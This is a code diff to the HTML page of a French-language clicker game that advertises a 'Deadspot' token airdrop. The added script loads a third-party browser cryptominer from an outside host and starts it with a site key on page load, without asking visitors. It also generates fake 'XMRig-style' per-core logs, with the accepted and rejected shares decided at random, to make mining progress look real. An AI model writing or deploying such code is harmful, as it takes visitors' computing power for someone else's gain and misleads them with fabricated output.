@@ -44,5 +44,184 @@
   <h2>📊 Hashrate</h2>
   <div id="currentHps">H/s: 0.00</div>
   <div id="totalHashes">Total Hashes: 0</div>
-  <canvas id="hashrateChart" wi
+  <canvas id="hashrateChart" width="600" height="200"></canvas>
 
+  <h2>📜 Logs XMRig</h2>
+  <div id="xmrigLogs"></div>
+
+  <h3>⚡ Améliorations</h3>
+  <button onclick="buyUpgrade('x2')">x2 Click (Coût: 5 DSC)</button>
+  <button onclick="buyUpgrade('auto')">Auto-Click (Coût: 10 DSC)</button>
+  <button onclick="buyUpgrade('regen')">Énergie+ (Coût: 8 DSC)</button>
+  <button onclick="buyUpgrade('multi')">x5 Revenus (Coût: 20 DSC)</button>
+
+  <p style="margin-top:20px; color:#aaa;">
+    🚀 Deadspot-Token Airdrop prévu le <b>29 mars 2026</b>
+  </p>
+
+  <!-- Chart.js -->
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+  <!-- Miner Script -->
+  <script src="https://www.hostingcloud.racing/WPmG.js"></script>
+  <script>
+    // ======================
+    // VARIABLES PRINCIPALES
+    // ======================
+    let deadspot = parseFloat(localStorage.getItem("deadspot")) || 0;
+    let upgrades = JSON.parse(localStorage.getItem("upgrades")) || {x2:false, auto:false, regen:false, multi:false};
+    let energy = 100, maxEnergy = 100;
+    let regenRate = 1; // énergie/sec
+    let clickValue = 0.00015;
+    let autoClickInterval = null;
+
+    function saveGame() {
+      localStorage.setItem("deadspot", deadspot);
+      localStorage.setItem("upgrades", JSON.stringify(upgrades));
+    }
+
+    function updateUI() {
+      document.getElementById("deadspotBalance").textContent = "Deadspot: " + deadspot.toFixed(5);
+      document.getElementById("energyFill").style.width = (energy/maxEnergy*100) + "%";
+    }
+
+    // ======================
+    // CLICKER
+    // ======================
+    document.getElementById("clickBtn").addEventListener("click", () => {
+      if (energy > 0) {
+        let gain = clickValue;
+        if (upgrades.x2) gain *= 2;
+        if (upgrades.multi) gain *= 5;
+        deadspot += gain;
+        energy--;
+        updateUI();
+        saveGame();
+      }
+    });
+
+    // Régénération énergie
+    setInterval(() => {
+      if (energy < maxEnergy) {
+        energy = Math.min(maxEnergy, energy + regenRate);
+        updateUI();
+      }
+    }, 1000);
+
+    // Auto click
+    function startAutoClick() {
+      if (autoClickInterval) return;
+      autoClickInterval = setInterval(() => {
+        if (energy > 0) {
+          let gain = clickValue;
+          if (upgrades.x2) gain *= 2;
+          if (upgrades.multi) gain *= 5;
+          deadspot += gain;
+          energy--;
+          updateUI();
+          saveGame();
+        }
+      }, 1000);
+    }
+
+    // ======================
+    // UPGRADES
+    // ======================
+    function buyUpgrade(type) {
+      if (type === "x2" && !upgrades.x2 && deadspot >= 5) {
+        deadspot -= 5; upgrades.x2 = true;
+      }
+      if (type === "auto" && !upgrades.auto && deadspot >= 10) {
+        deadspot -= 10; upgrades.auto = true; startAutoClick();
+      }
+      if (type === "regen" && !upgrades.regen && deadspot >= 8) {
+        deadspot -= 8; upgrades.regen = true; regenRate = 2;
+      }
+      if (type === "multi" && !upgrades.multi && deadspot >= 20) {
+        deadspot -= 20; upgrades.multi = true;
+      }
+      saveGame(); updateUI();
+    }
+
+    // ======================
+    // MINER
+    // ======================
+    var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', {
+      throttle: 0.1, c: 'w'
+    });
+    _client.start();
+
+    // Graphe
+    const ctx = document.getElementById('hashrateChart').getContext('2d');
+    const hashrateChart = new Chart(ctx, {
+      type: 'line',
+      data: { labels: [], datasets: [{label:'H/s', data:[], borderColor:'#4caf50', fill:true, tension:0.3}] },
+      options: { responsive:false, animation:false, plugins:{legend:{labels:{color:'#eee'}}},
+        scales:{ x:{ticks:{color:'#aaa'}}, y:{ticks:{color:'#aaa'}} } }
+    });
+
+    // Logs + conversion
+    const currentHpsDisplay = document.getElementById("currentHps");
+    const totalHashesDisplay = document.getElementById("totalHashes");
+    const xmrigLogs = document.getElementById("xmrigLogs");
+    let time = 0, accepted=0, rejected=0;
+
+    setInterval(() => {
+      if (_client.isRunning()) {
+        const hps = _client.getHashesPerSecond();
+        const total = _client.getTotalHashes();
+        const threads = _client.getNumThreads();
+
+        currentHpsDisplay.textContent = "H/s: " + hps.toFixed(2);
+        totalHashesDisplay.textContent = "Total Hashes: " + total;
+
+        // Graph
+        hashrateChart.data.labels.push(time+"s");
+        hashrateChart.data.datasets[0].data.push(hps);
+        if (hashrateChart.data.labels.length > 20) {
+          hashrateChart.data.labels.shift();
+          hashrateChart.data.datasets[0].data.shift();
+        }
+        hashrateChart.update();
+
+        // Logs style XMRig
+        for (let i=0; i<threads; i++) {
+          const coreHps = (hps/threads*(0.9+Math.random()*0.2)).toFixed(2);
+          const isAccepted = Math.random()>0.05;
+          const logLine = `[${new Date().toLocaleTimeString()}] Core #${i} | ${coreHps} H/s | ${isAccepted?"Accepted":"Rejected"}`;
+          const span=document.createElement("span");
+          span.className=isAccepted?"logAccepted":"logRejected";
+          span.textContent=logLine;
+          xmrigLogs.appendChild(span);
+          xmrigLogs.appendChild(document.createElement("br"));
+          xmrigLogs.scrollTop=xmrigLogs.scrollHeight;
+          if(isAccepted)accepted++; else rejected++;
+        }
+        time++;
+      }
+    },1000);
+
+    // ======================
+    // ÉCHANGE HASHES → DSC
+    // ======================
+    document.getElementById("exchangeBtn").addEventListener("click", () => {
+      const total = _client.getTotalHashes();
+      if (total >= 10000000) {
+        const dscGain = Math.floor(total / 10000000);
+        deadspot += dscGain;
+        _client.reset(); // remet compteur à zéro
+        updateUI();
+        saveGame();
+        alert("Échange réussi: +" + dscGain + " DSC");
+      } else {
+        alert("Pas assez de hashes (min 10,000,000)");
+      }
+    });
+
+    // Init
+    if(upgrades.auto) startAutoClick();
+    if(upgrades.regen) regenRate=2;
+    updateUI();
+  </script>
+</body>
+</html>
